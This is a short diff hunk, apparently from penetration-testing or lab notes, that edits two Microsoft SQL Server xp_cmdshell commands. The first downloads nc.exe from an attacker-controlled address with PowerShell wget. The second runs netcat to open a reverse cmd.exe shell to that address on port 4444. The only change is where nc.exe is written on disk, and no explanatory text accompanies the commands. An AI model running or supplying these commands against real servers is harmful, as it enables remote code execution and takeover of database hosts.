@@ -51,9 +51,9 @@
   ```
 
   ```
-  EXEC xp_cmdshell "powershell.exe wget http://192.168.119.156/nc.exe -OutFile nc.exe"
+  EXEC xp_cmdshell "powershell.exe wget http://192.168.119.156/nc.exe -OutFile C:\Users\Public\nc.exe"
   go
-  EXEC xp_cmdshell  "nc.exe -e cmd.exe 192.168.119.156 4444"
+  EXEC xp_cmdshell  "C:\Users\Public\nc.exe -e cmd.exe 192.168.119.156 4444"
   go
   ```
 
